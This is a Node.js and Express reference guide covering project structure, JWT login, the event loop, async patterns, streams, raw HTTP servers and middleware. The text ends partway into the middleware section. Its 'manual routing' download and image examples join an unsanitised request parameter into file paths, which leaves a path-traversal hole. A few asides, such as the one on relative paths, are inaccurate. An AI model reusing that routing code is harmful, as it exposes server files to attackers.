# Node.js & Express — Complete Reference

---

## Table of Contents

1. [Quick Start Guide](#1-quick-start-guide)
   - [Installation](#11-installation)
   - [Project Initialization](#12-project-initialization)
   - [Install Core Dependencies](#13-install-core-dependencies)
   - [Scripts Setup](#14-scripts-setup)
   - [Environment Setup](#15-environment-setup)
2. [Project File Structure](#2-project-file-structure)
   - [Folder Overview](#21-folder-overview)
   - [Entry Point — app.js](#22-entry-point--appjs)
   - [Config — config/env.js](#23-config--configenvjs)
   - [Models — models/](#24-models--models)
   - [Controllers — controllers/](#25-controllers--controllers)
   - [Routes — routes/](#26-routes--routes)
   - [Middleware — middleware/](#27-middleware--middleware)
   - [Utils — utils/](#28-utils--utils)
   - [Logs — logs/](#29-logs--logs)
3. [Node Internals](#3-node-internals)
   - [Running Node](#31-running-node)
   - [Importing Libraries](#32-importing-libraries)
   - [CJS vs MJS](#33-cjs-vs-mjs)
   - [Accessing Arguments](#34-accessing-arguments)
   - [Taking User Input](#35-taking-user-input)
4. [The Event Loop](#4-the-event-loop)
   - [The Three-Layer Stack](#41-the-three-layer-stack)
   - [Event Loop Phases](#42-event-loop-phases)
   - [process.nextTick vs setImmediate vs setTimeout](#43-processnexttick-vs-setimmediate-vs-settimeout)
   - [The Thread Pool](#44-the-thread-pool)
5. [Async Patterns](#5-async-patterns)
   - [Callbacks](#51-callbacks)
   - [Promises](#52-promises)
   - [async/await](#53-asyncawait)
   - [Sequential vs Parallel — The Critical Bug](#54-sequential-vs-parallel--the-critical-bug)
   - [Promise Static Methods](#55-promise-static-methods)
6. [Streams & Pipes](#6-streams--pipes)
   - [Reading a File with Streams](#61-reading-a-file-with-streams)
   - [pipe() vs pipeline()](#62-pipe-vs-pipeline)
7. [HTTP Server (Raw)](#7-http-server-raw)
   - [Creating a Server](#71-creating-a-server)
   - [Handling POST Requests](#72-handling-post-requests)
   - [Status Codes](#73-status-codes)
   - [Content Types](#74-content-types)
8. [Express](#8-express)
   - [ESLint Setup](#81-eslint-setup)
   - [express.static() vs Manual Routing](#82-expressstatic-vs-manual-routing)
   - [Middleware — Four Types](#83-middleware--four-types)
   - [Error Handling](#84-error-handling)
9. [REST API Design](#9-rest-api-design)
   - [HTTP Verbs](#91-http-verbs)
   - [Resource Naming Rules](#92-resource-naming-rules)
   - [Status Codes](#93-status-codes)
   - [API Versioning](#94-api-versioning)
10. [Mongoose](#10-mongoose)
    - [Setup](#101-setup)
    - [Schema & Unique Index Notes](#102-schema--unique-index-notes)
11. [JWT vs Sessions](#11-jwt-vs-sessions)
    - [How Sessions Work](#111-how-sessions-work)
    - [How JWT Works](#112-how-jwt-works)
    - [JWT Structure](#113-jwt-structure)
    - [JWT Size — Concrete Impact](#114-jwt-size--concrete-impact)
    - [JWT Implementation in Express](#115-jwt-implementation-in-express)
    - [The Invalidation Problem](#116-the-invalidation-problem)
    - [Token Storage — Client Side](#117-token-storage--client-side)
    - [XSS & CSRF Explained](#118-xss--csrf-explained)
    - [The Core Tradeoff](#119-the-core-tradeoff)
12. [CORS](#12-cors)
    - [The Same-Origin Policy](#121-the-same-origin-policy)
    - [Simple vs Preflight Requests](#122-simple-vs-preflight-requests)
    - [CORS in Express](#123-cors-in-express)
    - [CORS Headers Reference](#124-cors-headers-reference)
13. [Environment Config & Secrets](#13-environment-config--secrets)
    - [The Problem — Hardcoded Secrets](#131-the-problem--hardcoded-secrets)
    - [The Solution — Environment Variables](#132-the-solution--environment-variables)
    - [Fail Fast Validation](#133-fail-fast-validation)
    - [Secret Compromised — Remediation Order](#134-secret-compromised--remediation-order)
14. [Compiler vs Interpreter vs JIT](#14-compiler-vs-interpreter-vs-jit)
15. [Interview-Ready Summaries](#15-interview-ready-summaries)
15. [Interview-Ready Summaries](#16-interview-ready-summaries)
16. [References](#17-references)

---

## 1. Quick Start Guide

### 1.1 Installation

```bash
# Install Node.js (use the LTS version)
# https://nodejs.org/en/download

# Verify installation
node -v
npm -v
```

### 1.2 Project Initialization

```bash
mkdir my-project
cd my-project
npm init -y          # creates package.json with defaults
```

### 1.3 Install Core Dependencies

```bash
# Production dependencies
npm install express mongoose dotenv jsonwebtoken bcrypt cors

# Dev dependencies — never go to production
npm install --save-dev nodemon eslint
```

Your `package.json` should separate them:

```json
{
  "dependencies": {
    "express": "^4.18.2",
    "mongoose": "^8.0.0",
    "dotenv": "^16.3.1",
    "jsonwebtoken": "^9.0.0",
    "bcrypt": "^5.1.1",
    "cors": "^2.8.5"
  },
  "devDependencies": {
    "nodemon": "^3.0.1",
    "eslint": "^8.56.0"
  }
}
```

> **Why dev dependencies matter:** Things like `eslint` and `nodemon` should never
> ship to production. They inflate bundle size and introduce unnecessary attack surface.

### 1.4 Scripts Setup

In `package.json`:

```json
"scripts": {
  "start": "node app.js",
  "dev": "nodemon app.js",
  "lint": "npx eslint .",
  "test": "echo \"Error: no test specified\" && exit 1"
}
```

Run them with:

```bash
npm run dev      # development with auto-restart
npm start        # production
npm run lint     # manual lint check
```

### 1.5 Environment Setup

```bash
# Create your .env file
touch .env
touch .env.example
touch .gitignore
```

Add to `.gitignore` immediately — before your first commit:

```bash
# .gitignore
.env
.env.local
.env.production
node_modules/
logs/
*.log
```

Populate `.env` (never commit this):

```bash
PORT=3000
NODE_ENV=development
MONGODB_URI=mongodb://127.0.0.1:27017/mydb
JWT_SECRET=a_long_random_unguessable_string_minimum_32_chars
```

Populate `.env.example` (commit this — no real values):

```bash
PORT=
NODE_ENV=
MONGODB_URI=
JWT_SECRET=
```

---

## 2. Project File Structure

### 2.1 Folder Overview

```
my-project/
├── app.js                    ← entry point — wires everything together
├── package.json
├── .env                      ← gitignored, local secrets only
├── .env.example              ← committed, shows structure without values
├── .gitignore
│
├── config/
│   └── env.js                ← validates + exports all environment variables
│
├── controllers/
│   ├── userController.js     ← business logic for user routes
│   └── postController.js
│
├── logs/
│   └── app.log               ← runtime logs (gitignored)
│
├── middleware/
│   ├── auth.js               ← JWT verification middleware
│   ├── errorHandler.js       ← global 4-argument error handler
│   └── requestLogger.js      ← logs method + path for every request
│
├── models/
│   ├── User.js               ← Mongoose schema + model
│   └── Post.js
│
├── routes/
│   ├── index.js              ← root router — mounts all sub-routers
│   ├── userRoutes.js         ← /users endpoints
│   └── postRoutes.js         ← /posts endpoints
│
└── utils/
    ├── AppError.js           ← custom error class
    └── asyncHandler.js       ← wraps async route handlers (Express 4)
```

---

### 2.2 Entry Point — app.js

```js
// app.js
require('dotenv').config();                     // must be first line
const config = require('./config/env');         // validates env vars at startup
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');
const routes = require('./routes');
const errorHandler = require('./middleware/errorHandler');
const requestLogger = require('./middleware/requestLogger');

const app = express();

// ── Global Middleware ──────────────────────────────────────────────
app.use(cors({
  origin: config.allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
}));

app.use(express.json());           // parse JSON bodies
app.use(express.urlencoded({ extended: true })); // parse form data
app.use(requestLogger);            // log every request

// ── Routes ────────────────────────────────────────────────────────
app.use('/api', routes);           // all routes live under /api

// ── Error Handler — always last ───────────────────────────────────
app.use(errorHandler);

// ── Database + Server ─────────────────────────────────────────────
mongoose.connect(config.mongoUri)
  .then(() => {
    console.log('MongoDB connected');
    app.listen(config.port, () => {
      console.log(`Server running on port ${config.port}`);
    });
  })
  .catch(err => {
    console.error('DB connection failed:', err.message);
    process.exit(1);
  });
```

---

### 2.3 Config — config/env.js

Validates all required environment variables at startup. If anything is missing,
the app crashes immediately with a clear message — far better than a cryptic failure
two hours into production.

```js
// config/env.js
require('dotenv').config();

const required = ['MONGODB_URI', 'JWT_SECRET', 'PORT'];

required.forEach(key => {
  if (!process.env[key]) {
    throw new Error(`Missing required environment variable: ${key}`);
  }
});

module.exports = {
  mongoUri:       process.env.MONGODB_URI,
  jwtSecret:      process.env.JWT_SECRET,
  port:           process.env.PORT || 3000,
  nodeEnv:        process.env.NODE_ENV || 'development',
  isProd:         process.env.NODE_ENV === 'production',
  allowedOrigins: process.env.NODE_ENV === 'production'
    ? ['https://app.myapp.com']
    : ['https://app.myapp.com', 'http://localhost:3000']
};
```

---

### 2.4 Models — models/

```js
// models/User.js
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  name: {
    type: String,
    required: [true, 'Name is required'],
    trim: true
  },
  email: {
    type: String,
    required: [true, 'Email is required'],
    unique: true,       // creates a MongoDB unique index
    lowercase: true,
    trim: true
  },
  password: {
    type: String,
    required: [true, 'Password is required'],
    minlength: 8,
    select: false       // never returned in queries by default
  },
  role: {
    type: String,
    enum: ['user', 'admin'],
    default: 'user'
  }
}, {
  timestamps: true      // adds createdAt and updatedAt automatically
});

module.exports = mongoose.model('User', userSchema);
```

> **Mongoose unique index note:** `unique: true` is not a Mongoose validator — it's
> a MongoDB index instruction. Mongoose offloads uniqueness checking to MongoDB's
> indexing engine to avoid race conditions. When a duplicate is saved, MongoDB throws
> an `E11000` driver-level error — handle it explicitly.
>
> In production, set `autoIndex: false` and create indexes via the MongoDB shell for
> better control. When you drop a collection locally, restart nodemon — otherwise the
> index won't be recreated and the unique constraint will silently stop working.

---

### 2.5 Controllers — controllers/

Controllers hold business logic. Routes call controllers. Controllers never touch
the request/response cycle beyond what's needed.

```js
// controllers/userController.js
const User = require('../models/User');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');
const config = require('../config/env');
const AppError = require('../utils/AppError');
const asyncHandler = require('../utils/asyncHandler');

// POST /api/users/register
const register = asyncHandler(async (req, res) => {
  const { name, email, password } = req.body;

  const existing = await User.findOne({ email });
  if (existing) throw new AppError('Email already in use', 409);

  const hashed = await bcrypt.hash(password, 12);
  const user = await User.create({ name, email, password: hashed });

  res.status(201).json({
    message: 'User created',
    user: { id: user._id, name: user.name, email: user.email }
  });
});

// POST /api/users/login
const login = asyncHandler(async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email }).select('+password');
  if (!user) throw new AppError('Invalid credentials', 401);

  const match = await bcrypt.compare(password, user.password);
  if (!match) throw new AppError('Invalid credentials', 401);

  const token = jwt.sign(
    { id: user._id, role: user.role },
    config.jwtSecret,
    { expiresIn: '15m' }          // always short — use refresh tokens for longer sessions
  );

  res.status(200).json({ token });
});

// GET /api/users/me
const getMe = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user.id);
  if (!user) throw new AppError('User not found', 404);
  res.status(200).json({ user });
});

module.exports = { register, login, getMe };
```

---

### 2.6 Routes — routes/

#### routes/index.js — The Root Router

All sub-routers are mounted here. `app.js` uses only this file.

```js
// routes/index.js
const express = require('express');
const router = express.Router();

const userRoutes = require('./userRoutes');
const postRoutes = require('./postRoutes');

router.use('/users', userRoutes);   // → /api/users/*
router.use('/posts', postRoutes);   // → /api/posts/*

module.exports = router;
```

#### routes/userRoutes.js

```js
// routes/userRoutes.js
const express = require('express');
const router = express.Router();
const { register, login, getMe } = require('../controllers/userController');
const auth = require('../middleware/auth');

router.post('/register', register);     // POST /api/users/register — public
router.post('/login', login);           // POST /api/users/login    — public
router.get('/me', auth, getMe);         // GET  /api/users/me       — protected

module.exports = router;
```

#### routes/postRoutes.js

```js
// routes/postRoutes.js
const express = require('express');
const router = express.Router();
const { getPosts, getPost, createPost, updatePost, deletePost } = require('../controllers/postController');
const auth = require('../middleware/auth');

router.get('/', getPosts);                        // GET    /api/posts       — public
router.get('/:id', getPost);                      // GET    /api/posts/:id   — public
router.post('/', auth, createPost);               // POST   /api/posts       — protected
router.patch('/:id', auth, updatePost);           // PATCH  /api/posts/:id   — protected
router.delete('/:id', auth, deletePost);          // DELETE /api/posts/:id   — protected

module.exports = router;
```

---

### 2.7 Middleware — middleware/

#### middleware/auth.js

```js
// middleware/auth.js
const jwt = require('jsonwebtoken');
const config = require('../config/env');
const AppError = require('../utils/AppError');

const auth = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1]; // "Bearer <token>"

  if (!token) return next(new AppError('No token provided', 401));

  try {
    const decoded = jwt.verify(token, config.jwtSecret);
    req.user = decoded;   // attach decoded payload to request — { id, role }
    next();
  } catch (err) {
    next(new AppError('Invalid or expired token', 401));
  }
};

module.exports = auth;
```

#### middleware/errorHandler.js

Must have exactly 4 arguments — this is how Express identifies it as an error handler.
Must be registered last in app.js.

```js
// middleware/errorHandler.js
const config = require('../config/env');

const errorHandler = (err, req, res, next) => {
  const status = err.status || 500;
  const message = err.message || 'Internal Server Error';

  // Never expose stack traces in production
  const response = config.isProd
    ? { error: message }
    : { error: message, stack: err.stack };

  res.status(status).json(response);
};

module.exports = errorHandler;
```

#### middleware/requestLogger.js

```js
// middleware/requestLogger.js
const requestLogger = (req, res, next) => {
  const timestamp = new Date().toISOString();
  console.log(`[${timestamp}] ${req.method} ${req.path}`);
  next(); // must call next or request hangs
};

module.exports = requestLogger;
```

---

### 2.8 Utils — utils/

#### utils/AppError.js

Custom error class — carries a status code so the error handler can respond correctly
without needing conditional logic per error type.

```js
// utils/AppError.js
class AppError extends Error {
  constructor(message, status) {
    super(message);
    this.status = status;
    this.name = 'AppError';
  }
}

module.exports = AppError;

// Usage anywhere in the app:
// throw new AppError('User not found', 404);
// throw new AppError('Email already exists', 409);
// throw new AppError('Unauthorized', 401);
```

#### utils/asyncHandler.js

Wraps async route handlers in Express 4 so you don't need try/catch in every
controller. Express 5 does this automatically — but for Express 4 this is essential.

```js
// utils/asyncHandler.js
const asyncHandler = (fn) => (req, res, next) => {
  Promise.resolve(fn(req, res, next)).catch(next); // forwards thrown errors to errorHandler
};

module.exports = asyncHandler;

// Usage in controllers:
// const getUser = asyncHandler(async (req, res) => {
//   const user = await User.findById(req.params.id);
//   if (!user) throw new AppError('User not found', 404);
//   res.json(user);
// });
```

---

### 2.9 Logs — logs/

```bash
# logs/ directory — gitignored
logs/
└── app.log     ← runtime application logs
```

Add to `.gitignore`:

```bash
logs/
*.log
```

For production logging, use a library like `winston` or `pino` that writes structured
logs to files and external services instead of `console.log`.

---

## 3. Node Internals

### 3.1 Running Node

```bash
node index.js           # run a file
node index.js add       # run with a command argument
```

### 3.2 Importing Libraries

```js
// Built-in modules — no install needed
const fs   = require('fs');
const path = require('path');
const http = require('http');

// Path joining — always use path.join for cross-OS compatibility
// Paths differ between Windows (backslash) and Unix (forward slash)
const todosPath = path.join(__dirname, 'todos.json');

// Read a file synchronously
const todos = JSON.parse(fs.readFileSync(todosPath, 'utf-8'));
```

### 3.3 CJS vs MJS

The two module systems in Node.js:

| | CJS (CommonJS) | MJS (ES Modules) |
|---|---|---|
| **Syntax** | `require` / `module.exports` | `import` / `export` |
| **Loading** | Synchronous | Asynchronous |
| **File extension** | `.js` (default) or `.cjs` | `.mjs` or `.js` with `"type":"module"` |
| **`__dirname`** | ✅ Available | ❌ Needs workaround |
| **Top-level `await`** | ❌ No | ✅ Yes |
| **Tree shaking** | ❌ No | ✅ Yes |
| **Browser compatible** | ❌ No | ✅ Yes |

```js
// CJS — require / module.exports
const helper = require('./helper');
module.exports = { greet };

// MJS — import / export (extension required)
import { greet } from './utils.js';
export function greet() {}
export default greet;
```

**The `__dirname` workaround in MJS:**

```js
// CJS — just works
console.log(__dirname);

// MJS — need this workaround
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname  = dirname(__filename);
```

**Interop rules — important gotcha:**

```js
// ✅ MJS can import CJS
import cjsModule from './legacy.cjs';

// ❌ CJS cannot require() MJS — throws ERR_REQUIRE_ESM
const esm = require('./modern.mjs');

// ✅ CJS can dynamically import MJS (async only)
async function load() {
  const esm = await import('./modern.mjs');
}
```

### 3.4 Accessing Arguments

```js
// process.argv = ['node', 'script.js', 'add', 'my item']
const [, , command, value] = process.argv;
// command = 'add', value = 'my item'

console.log(command); // 'add'
console.log(value);   // 'my item'
```

### 3.5 Taking User Input

```js
const { createInterface } = require('node:readline');

const rl = createInterface({
  input: process.stdin,
  output: process.stdout,
});

async function runCLI() {
  const name = await rl.question('What is your item name? ');
  const size = await rl.question('What is your item size? ');
  console.log(`Name: ${name}, Size: ${size}`);
  rl.close(); // always close the stream or the process hangs
}

runCLI();
```

---

## 4. The Event Loop

### 4.1 The Three-Layer Stack

```
Your JS Code
     ↓
  V8 Engine     ← compiles and executes JavaScript only
     ↓
  libuv         ← implements the event loop, thread pool, OS async I/O
     ↓
  OS Kernel     ← actual file reads, network calls, etc.
```

- **V8** — executes your JavaScript. Has no concept of I/O, timers, or async.
- **libuv** — provides the event loop, thread pool (default 4 threads), and OS-level
  async I/O using `epoll` (Linux) or `kqueue` (macOS).
- **OS Kernel** — handles actual network and file operations at the system level.

### 4.2 Event Loop Phases

```
┌─────────────────────────┐
│         timers          │  ← setTimeout / setInterval callbacks
└──────────┬──────────────┘
           │
┌──────────▼──────────────┐
│     pending callbacks   │  ← I/O errors from previous iteration
└──────────┬──────────────┘
           │
┌──────────▼──────────────┐
│       idle, prepare     │  ← internal use only
└──────────┬──────────────┘
           │
┌──────────▼──────────────┐
│          poll           │  ← retrieve new I/O events ← CORE PHASE
└──────────┬──────────────┘
           │
┌──────────▼──────────────┐
│          check          │  ← setImmediate callbacks
└──────────┬──────────────┘
           │
┌──────────▼──────────────┐
│     close callbacks     │  ← socket.on('close') etc.
└─────────────────────────┘
```

**Between every phase transition:**

```
phase ends
    → nextTick queue drains completely   ← highest priority
    → microtask queue drains             ← Promise .then callbacks
    → next phase begins
```

**Interview-ready answer:**
> "Node runs JavaScript on a single thread using V8. It achieves concurrency through
> an event-driven non-blocking I/O model powered by libuv. libuv implements the event
> loop, which processes callbacks in fixed phases. Slow operations are offloaded to
> libuv's thread pool or OS async APIs. The main thread is never blocked waiting —
> it's always processing the next available callback."

### 4.3 process.nextTick vs setImmediate vs setTimeout

**The naming trap:** `process.nextTick` does NOT mean "next loop iteration". It fires
before the event loop moves to the next phase — interrupting between phases. The Node
docs acknowledge the names should have been swapped.

```js
setImmediate(() => console.log('setImmediate'));       // check phase
process.nextTick(() => console.log('nextTick'));       // before any phase transition
Promise.resolve().then(() => console.log('promise')); // microtask queue
console.log('synchronous');                           // call stack — runs first

// Output:
// synchronous
// nextTick
// promise
// setImmediate
```

**Inside an I/O callback — order is guaranteed:**

```js
fs.readFile('file.txt', () => {
  setTimeout(() => console.log('timeout'), 0);
  setImmediate(() => console.log('immediate'));
});

// Always:
// immediate   ← check phase is next after poll
// timeout     ← timers phase already passed this iteration
```

**Outside I/O — order is non-deterministic:**

```js
setTimeout(() => console.log('timeout'), 0);
setImmediate(() => console.log('immediate'));
// Order NOT guaranteed — depends on OS timer resolution
```

**Decision table:**

| Choice | When to use it |
|---|---|
| `process.nextTick` | Run before anything else — before next phase. Use sparingly — can starve the loop |
| `setImmediate` | After current I/O this iteration — predictable, safe for post-I/O cleanup |
| `setTimeout(fn, 0)` | When loop placement doesn't matter — least predictable of the three |

### 4.4 The Thread Pool

libuv maintains a thread pool (`UV_THREADPOOL_SIZE`, default: 4) for operations that
lack reliable OS-level async primitives:

- File system operations (`fs.readFile`, `fs.writeFile`, etc.)
- DNS resolution (`dns.lookup`)
- Crypto (`crypto.pbkdf2`, `crypto.randomBytes`)
- Zlib compression

Network I/O (HTTP, TCP, UDP) does NOT use the thread pool — it uses OS-level async
primitives (`epoll` / `kqueue`) directly. This is inferred from the libuv design docs,
not stated as a single explicit line.

---

## 5. Async Patterns

Each generation exists because the previous one made error handling, composition,
and readability progressively harder as complexity grew.

### 5.1 Callbacks

Node's original async primitive. Error-first convention — first argument is always
the error, always.

```js
fs.readFile('file.txt', (err, data) => {
  if (err) throw err;       // always check error first
  console.log(data);
});
```

**Why it breaks down — callback hell:**

```js
fs.readFile('a.txt', (err, a) => {
  fs.readFile('b.txt', (err, b) => {
    fs.readFile('c.txt', (err, c) => {
      db.save(a + b + c, (err, result) => {
        // logic flows diagonally — unreadable at scale
        // error must be handled manually at every single level
      });
    });
  });
});
```

Problems: manual error handling at every level, deep nesting, impossible to compose.

### 5.2 Promises

A Promise is an object representing an async operation. Three states: `pending` →
`fulfilled` / `rejected`.

```js
fs.promises.readFile('a.txt')
  .then(data => process(data))       // chain, not nest
  .then(result => db.save(result))
  .catch(err => console.error(err)); // ONE handler for the whole chain
```

Solves: centralized error handling, linear chaining, composability.

### 5.3 async/await

Syntactic sugar over Promises. Every `async` function returns a Promise.
Lets async code read like synchronous code without blocking the thread.

```js
async function processFiles() {
  try {
    const a = await fs.promises.readFile('a.txt'); // waits, does not block
    const b = await fs.promises.readFile('b.txt');
    const result = await db.save(a + b);
    return result;
  } catch (err) {
    console.error(err); // one try/catch handles everything
  }
}
```

### 5.4 Sequential vs Parallel — The Critical Bug

The most common async/await mistake in production code:

```js
// ❌ Sequential — independent operations waiting on each other unnecessarily
const user    = await db.findUser(id);    // 200ms — waits
const posts   = await db.findPosts(id);   // 200ms — waits for user to finish first
const friends = await db.findFriends(id); // 200ms — waits for posts to finish first
// Total: 600ms — pure waste if these are independent

// ✅ Parallel — all three start at once
const [user, posts, friends] = await Promise.all([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);
// Total: ~200ms — bounded by the slowest call only
```

At 1,000 concurrent users, that 400ms difference compounds into real infrastructure cost.

### 5.5 Promise Static Methods

```js
// All must succeed — one failure rejects everything (fail-fast)
const [user, posts, friends] = await Promise.all([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);

// All settle regardless — get partial results, handle each independently
const results = await Promise.allSettled([
  db.findUser(id),
  db.findPosts(id),
  db.findFriends(id)
]);
results.forEach(r => {
  if (r.status === 'fulfilled') use(r.value);
  else logError(r.reason);
});

// First success wins — ignores failures
const first = await Promise.any([fetchA(), fetchB(), fetchC()]);

// First result wins — success or failure
const fastest = await Promise.race([fetchA(), fetchB(), fetchC()]);
```

**When to use which:**

| Scenario | Use |
|---|---|
| All results required — one fail = whole operation fails | `Promise.all` |
| Partial results acceptable — handle each independently | `Promise.allSettled` |
| First success is enough, ignore failures | `Promise.any` |
| First result wins — success or failure | `Promise.race` |

---

## 6. Streams & Pipes

Instead of reading an entire file into memory, streams process data in chunks.
Useful for large files, pagination, and video/audio serving.

### 6.1 Reading a File with Streams

```js
function readFile(filePath) {
  return new Promise((resolve, reject) => {
    const stream = fs.createReadStream(filePath, { encoding: 'utf-8' });

    let data = '';

    stream.on('data', (chunk) => {   // data arrives in chunks
      data += chunk;
    });

    stream.on('end', () => {         // all chunks received
      resolve(data);
    });

    stream.on('error', reject);      // forward any error to Promise rejection
  });
}
```

### 6.2 pipe() vs pipeline()

**`pipe()` — simple but has a pitfall:**

```js
// Copying a file
const readStream  = fs.createReadStream('source.txt');
const writeStream = fs.createWriteStream('destination.txt');
readStream.pipe(writeStream);

// Serving a large file over HTTP
const server = http.createServer((req, res) => {
  const stream = fs.createReadStream('large-video.mp4');
  stream.pipe(res);
  stream.on('error', (err) => {
    res.statusCode = 500;
    res.end('Server error');
  });
});

// Chaining pipes — compress a file
fs.createReadStream('input.txt')
  .pipe(zlib.createGzip())
  .pipe(fs.createWriteStream('input.txt.gz'));
```

> ⚠️ `pipe()` pitfall: if one stream in the chain fails, the others are NOT
> automatically closed — this causes a memory leak.

**`pipeline()` — use this for production code:**

```js
const { pipeline } = require('stream');
const fs   = require('fs');
const zlib = require('zlib');

pipeline(
  fs.createReadStream('input.txt'),
  zlib.createGzip(),
  fs.createWriteStream('input.txt.gz'),
  (err) => {
    if (err) console.error('Pipeline failed:', err);
    else console.log('Pipeline complete');
  }
);
// If any stream errors, ALL streams are closed and cleaned up automatically
```

---

## 7. HTTP Server (Raw)

### 7.1 Creating a Server

```js
const http = require('http');
const path = require('path');
const fs   = require('fs');

const server = http.createServer(async (req, res) => {
  const { method, url } = req;
  const params = url.split('/');  // split path into segments

  // Example: GET http://127.0.0.1:3000/inventory/1
  // url = '/inventory/1'
  // params = ['', 'inventory', '1']

  if (method === 'GET' && params[1] === 'inventory') {
    const id = params[2]; // '1'
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.write(JSON.stringify({ id, name: 'Item' }));
    res.end();
    return;
  }

  res.writeHead(404, { 'Content-Type': 'application/json' });
  res.write(JSON.stringify({ error: 'Not found' }));
  res.end();
});

server.listen(3000, () => console.log('Server on port 3000'));
```

> **Server paths vs file system paths:** A URL like `/home.html` does not map directly
> to `pages/home.html` in your file system. The URL param is what the client requests —
> inside your condition, you provide the real file system path using `path.join`.
>
> In HTML, always use server-relative paths:
> ```html
> ✅ <link rel="stylesheet" href="/style/home.css">
> ✅ <img src="/public/images/logo.jpg">
> ❌ ../style/home.css   ← relative paths don't work for HTTP
> ❌ C:/Users/...        ← absolute file paths never work in HTML
> ```

### 7.2 Handling POST Requests

```js
const server = http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/data') {
    let body = '';

    req.on('data', chunk => {
      body += chunk.toString();   // accumulate chunks
    });

    req.on('end', () => {
      try {
        const postData = JSON.parse(body);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.write(JSON.stringify({ received: postData }));
        res.end();
      } catch (error) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.write(JSON.stringify({ error: error.message }));
        res.end();
      }
    });
  }
});
```

> Always write the head (`res.writeHead`) before writing the body (`res.write`).
> Writing in the wrong order causes a Node error.

### 7.3 Status Codes

```
1xx — Informational
  100 Continue
  101 Switching Protocols

2xx — Success
  200 OK
  201 Created
  202 Accepted
  204 No Content
  206 Partial Content

3xx — Redirection
  301 Moved Permanently
  302 Found
  304 Not Modified
  307 Temporary Redirect
  308 Permanent Redirect

4xx — Client Error
  400 Bad Request          → malformed input, validation failure
  401 Unauthorized         → not authenticated
  403 Forbidden            → authenticated but not permitted
  404 Not Found
  405 Method Not Allowed
  408 Request Timeout
  409 Conflict             → duplicate resource, state conflict
  410 Gone
  422 Unprocessable Content → valid syntax, failed business rules
  429 Too Many Requests

5xx — Server Error
  500 Internal Server Error
  501 Not Implemented
  502 Bad Gateway
  503 Service Unavailable
  504 Gateway Timeout
```

### 7.4 Content Types

```
Text:
  text/plain                   → plain text
  text/html                    → HTML documents
  text/css                     → CSS stylesheets
  text/javascript              → JavaScript files
  text/csv                     → CSV data

Application:
  application/json             → JSON data
  application/xml              → XML documents
  application/pdf              → PDF documents
  application/zip              → ZIP archives
  application/octet-stream     → binary data (generic)
  application/x-www-form-urlencoded → form data

Image:
  image/jpeg
  image/png
  image/gif
  image/webp
  image/svg+xml

Audio:
  audio/mpeg                   → MP3
  audio/wav
  audio/ogg

Video:
  video/mp4
  video/webm
  video/ogg

Font:
  font/woff
  font/woff2
```

---

## 8. Express

### 8.1 ESLint Setup

```bash
npm install eslint --save-dev
```

Create `eslint.config.js`:

```js
import globals from 'globals';
import js from '@eslint/js';
import { defineConfig } from 'eslint/config';

export default defineConfig([
  {
    files: ['**/*.{js,mjs,cjs}'],
    plugins: { js },
    extends: ['js/recommended'],
    languageOptions: { globals: globals.node },
    rules: {
      'no-console': 'off',           // allow console.log in Node
      'prefer-const': 'error',       // force const over let where possible
      'eqeqeq': ['error', 'always'], // always use === not ==
      'no-var': 'error',             // ban var entirely
      'indent': ['error', 2],        // 2-space indentation
      'semi': ['error', 'always']    // require semicolons
    }
  }
]);
```

Enable auto-fix in VS Code `.vscode/settings.json`:

```json
{
  "editor.codeActionsOnSave": {
    "source.fixAll.eslint": "explicit"
  }
}
```

Run manually:

```bash
npx eslint .
```

### 8.2 express.static() vs Manual Routing

**Manual routing — for protected or tracked files:**

```js
// Full control — but repetitive, no caching, manual MIME types
app.get('/css/home.css', (req, res) => {
  const filePath = path.join(__dirname, 'public/css/home.css');
  res.sendFile(filePath);
});

// Protect PDF downloads — auth required
app.get('/download/:filename', auth, (req, res) => {
  const filePath = path.join(__dirname, 'protected/files', req.params.filename);
  res.download(filePath);
});

// Log image access for analytics
app.get('/images/:filename', (req, res) => {
  console.log(`Downloaded: ${req.params.filename}`);
  res.sendFile(path.join(__dirname, 'public/images', req.params.filename));
});
```

**express.static() — for public assets:**

```js
// One line handles all public static files with automatic caching
app.use(express.static('public'));

// With a URL prefix and options
app.use('/static', express.static('public', {
  maxAge: '1h',      // browser caches for 1 hour
  etag: true,        // sends ETag headers for 304 Not Modified support
  dotfiles: 'deny'   // never serve hidden files like .env
}));
```

**Performance comparison:**

```
Manual routing:
  Request 1: GET /css/home.css → 200 OK + 50KB body
  Request 2: GET /css/home.css → 200 OK + 50KB body (re-sent every time)
  Total: 100KB

express.static():
  Request 1: GET /css/home.css → 200 OK + ETag + 50KB body
  Request 2: GET /css/home.css → 304 Not Modified (no body at all)
  Total: 50KB
```

| Scenario | Use |
|---|---|
| Public CSS, JS, images, fonts | `express.static()` |
| Auth-required file downloads | Manual routing |
| File access analytics/logging | Manual routing |
| Large number of static assets | `express.static()` |

### 8.3 Middleware — Four Types

**What middleware is:** a function. Every request walks through a chain of functions
in the order you define them.

```js
// Standard middleware — 3 arguments
(req, res, next) => { }

// Error-handling middleware — 4 arguments (Express identifies by this signature)
(err, req, res, next) => { }
```

**next() — three behaviors:**

```js
next()          // move to next middleware — normal flow
next(err)       // skip everything, go straight to error handler
next('route')   // skip remaining handlers in current route only
```

**1. Application-level — runs on every request:**

```js
app.use((req, res, next) => {
  console.log(`${req.method} ${req.path}`);
  next(); // must call this or request hangs forever
});
```

**2. Router-level — scoped to a specific router:**

```js
const router = express.Router();
router.use((req, res, next) => {
  // only runs for routes mounted on this router
  next();
});
```

**3. Built-in middleware:**

```js
app.use(express.json());                    // parses JSON request bodies
app.use(express.urlencoded({ extended: true })); // parses form data
app.use(express.static('public'));          // serves static files
```

**4. Error-handling middleware — two hard rules:**

